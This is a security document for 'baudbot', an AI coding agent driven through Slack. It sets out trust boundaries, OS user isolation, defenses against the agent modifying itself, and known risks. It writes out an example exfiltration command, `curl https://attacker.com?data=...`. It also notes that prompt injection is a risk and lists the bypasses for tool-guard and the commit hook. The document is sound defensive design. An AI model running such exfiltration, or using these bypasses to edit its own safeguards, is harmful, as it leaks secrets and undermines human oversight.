# Security

For product overview and team workflow context, start with [README.md](README.md). For architecture and operations docs, see [`docs/architecture.md`](docs/architecture.md) and [`docs/operations.md`](docs/operations.md).

## Architecture: Source / Runtime Separation

```
~/baudbot/                              ← READ-ONLY source repo (admin-managed)
  ├── pi/extensions/                   ← source of truth for extensions
  ├── pi/skills/                       ← source of truth for skill templates
  ├── bin/                             ← admin scripts (deploy.sh, audit, firewall)
  └── slack-bridge/                    ← source of truth for bridge

~/.pi/agent/
  ├── extensions/                      ← DEPLOYED copies (real dir, not symlink)
  │   ├── tool-guard.ts               ← security-critical (deployed by admin)
  │   ├── auto-name.ts                ← agent-modifiable
  │   └── ...
  └── skills/                          ← agent-owned (agent updates freely)

~/runtime/
  └── slack-bridge/                    ← DEPLOYED copy (bridge runs from here)
      ├── bridge.mjs                   ← agent-modifiable
      ├── security.mjs                 ← security-critical (deployed by admin)
      └── node_modules/
```

The agent runs from deployed copies, never from the source repo directly.
Admin edits source → runs `bin/deploy.sh` → copies to runtime with correct permissions.

## Trust Boundaries

```
┌─────────────────────────────────────────────────────────────────┐
│                      UNTRUSTED                                   │
│   Slack messages, email body content, web-fetched content        │
└──────────────────────────────┬──────────────────────────────────┘
                               │
                               ▼
┌─────────────────────────────────────────────────────────────────┐
│               BOUNDARY 1: Access Control                         │
│   Slack bridge: SLACK_ALLOWED_USERS allowlist                    │
│   Email: allowed senders + shared secret (BAUDBOT_SECRET)         │
│   Content wrapping: external messages get security boundaries    │
└──────────────────────────────┬──────────────────────────────────┘
                               │
                               ▼
┌─────────────────────────────────────────────────────────────────┐
│               BOUNDARY 2: OS User Isolation                      │
│   baudbot_agent (uid 1001) — separate home, no sudo              │
│   Cannot read admin home directory (admin home is 700)           │
│   Source repo ~/baudbot/ is read-only (permissions + tool-guard)  │
│   Docker only via wrapper (blocks --privileged, host mounts)     │
└──────────────────────────────┬──────────────────────────────────┘
                               │
                               ▼
┌─────────────────────────────────────────────────────────────────┐
│               BOUNDARY 3: Network (if firewall applied)          │
│   Outbound: HTTP/HTTPS/SSH/DNS only                              │
│   No reverse shells, raw sockets, or non-standard ports          │
│   Localhost: bridge API, postgres, ollama                         │
└─────────────────────────────────────────────────────────────────┘
```

## Self-Modification Defense

| Layer | What | Bypassed by |
|-------|------|-------------|
| **Read-only source** | ~/baudbot/ lives under admin home (700 perms) — agent has zero access. Optional bind mount for defense-in-depth (not applied by default). | Root access |
| **File permissions** | Security-critical runtime files deployed `chmod a-w` by deploy.sh. Hard OS-level boundary — blocks `sed`, `python`, any write mechanism. | Root access or `chmod u+w` (which tool-guard blocks) |
| **Tool-guard rules** | Blocks Edit/Write tools to source repo + protected runtime files. Blocks `chmod`/`chown` on source repo via bash. Does NOT catch `sed`/`python` writes through bash — file permissions handle that. | `sed -i` through bash (caught by file perms) |
| **Integrity checks** | security-audit.sh compares runtime file hashes against deploy manifest | None (detection, not prevention) |
| **Pre-commit hook** | Blocks git commit of protected files in source repo | --no-verify (root-owned hook) |

The read-only source repo is the primary defense. Even if the agent modifies runtime copies,
the admin can re-deploy from the untampered source at any time.

## User Model

| User | Role | Sudo | Groups |
|------|------|------|--------|
| `<admin_user>` | Admin (human) | `(ALL) ALL`, `(baudbot_agent) NOPASSWD: ALL` | \<admin_user\>, wheel, docker, baudbot_agent |
| `baudbot_agent` | Agent (automated) | Only `/usr/local/bin/baudbot-docker` as root | baudbot_agent |

**Admin → baudbot_agent access**: The admin user is in the `baudbot_agent` group and has `NOPASSWD: ALL` as baudbot_agent via sudo. This is intentional for management. Run `bin/harden-permissions.sh` to ensure pi state files are owner-only (prevents passive group-level reads).

**baudbot_agent → admin access**: None. Admin home is `700`, baudbot_agent is not in the admin user's group.

## Control Plane Isolation

The control plane (`control-plane/server.mjs`) is an admin-owned web server on port 28800.

- Runs as the **admin user**, not `baudbot_agent`
- Port 28800 is **not** in the agent's firewall allowlist — the agent cannot reach it
- Provides read-only visibility into agent state (processes, config, sessions)
- Optional bearer token auth (`BAUDBOT_CP_TOKEN`)
- Config endpoint shows which env vars are set, **never** their values

The agent cannot use the control plane to reconfigure or inspect itself.

## Data Flows

```
Slack @mention
  → slack-bridge (Socket Mode, admin user)
    → content wrapping (security boundaries added)
      → Unix socket (~/.pi/session-control/*.sock)
        → control-agent (pi session, baudbot_agent user)
          → creates todo
          → delegates to dev-agent (pi session, baudbot_agent user)
            → git worktree → code changes → git push
          → dev-agent reports back
        → control-agent replies via curl → bridge HTTP API (127.0.0.1:7890)
      → Slack thread reply
```

## Credential Inventory

| Secret | Location | Perms | Purpose |
|--------|----------|-------|---------|
| LLM API key(s) | `~/.config/.env` | `600` | LLM API access (one or more of: `ANTHROPIC_API_KEY`, `OPENAI_API_KEY`, `GEMINI_API_KEY`, `OPENCODE_ZEN_API_KEY`) |
| GitHub OAuth token | `~/.config/gh/hosts.yml` | `600` | `gh` CLI auth (via `gh auth login`) |
| `AGENTMAIL_API_KEY` | `~/.config/.env` | `600` | AgentMail inbox access |
| `KERNEL_API_KEY` | `~/.config/.env` | `600` | Kernel cloud browsers |
| `BAUDBOT_SECRET` | `~/.config/.env` | `600` | Email authentication shared secret |
| SSH key | `~/.ssh/id_ed25519` | `600` | Git push (agent GitHub account) |
| `SLACK_BOT_TOKEN` | Bridge `.env` | `600` | Slack bot OAuth token |
| `SLACK_APP_TOKEN` | Bridge `.env` | `600` | Slack Socket Mode token |

## Deploy Workflow

```bash
# Admin edits source files in ~/baudbot/
# Then deploys to runtime:
~/baudbot/bin/deploy.sh

# If bridge is running, restart it:
sudo -u baudbot_agent bash -c 'cd ~/runtime/slack-bridge && node bridge.mjs'
```

## Known Risks

### Agent has unrestricted shell
Within its own user permissions, `baudbot_agent` can run any command. The tool-guard and safe-bash wrapper block known-dangerous patterns, but a prompt injection could attempt novel commands.

### Agent can modify its own runtime files
The deployed copies of non-security files (bridge.mjs, skills, most extensions) are agent-writable by design. The agent could modify these. Security-critical files (tool-guard.ts, security.mjs) are write-protected at the filesystem level and monitored via integrity checks.

### Agent has internet access
Even with port-based firewall rules, the agent can reach any host over HTTPS. Data exfiltration via `curl https://attacker.com?data=...` is possible.

### Content wrapping is a soft defense
The `<<<EXTERNAL_UNTRUSTED_CONTENT>>>` boundaries and security notice ask the LLM to ignore injected instructions. This raises the bar but is not a hard security boundary.

### Session logs are sensitive transcripts
Pi session logs (`.jsonl` files) contain full conversation transcripts for retained sessions. Baudbot now prunes old logs on startup (14-day retention) and redacts common secret patterns, but retained logs are still sensitive data and should stay owner-only (see `bin/harden-permissions.sh`).

## Security Scripts

| Script | Purpose | Run as |
|--------|---------|--------|
| `bin/security-audit.sh` | Check current security posture + integrity checks | baudbot_agent or admin |
| `bin/deploy.sh` | Deploy from source to runtime with correct permissions | root or admin |
| `bin/harden-permissions.sh` | Lock down pi state file permissions | baudbot_agent |
| `bin/prune-session-logs.sh` | Delete old pi session transcripts (retention cleanup) | baudbot_agent |
| `bin/setup-firewall.sh` | Apply port-based network restrictions | root |

## Reporting Vulnerabilities

Do **not** open a public GitHub issue for security vulnerabilities.

Instead, use [GitHub Security Advisories](https://github.com/modem-dev/baudbot/security/advisories/new) to report privately. You can also email security@modem.dev.

We'll acknowledge reports within 48 hours and aim to release a fix within 7 days for critical issues.
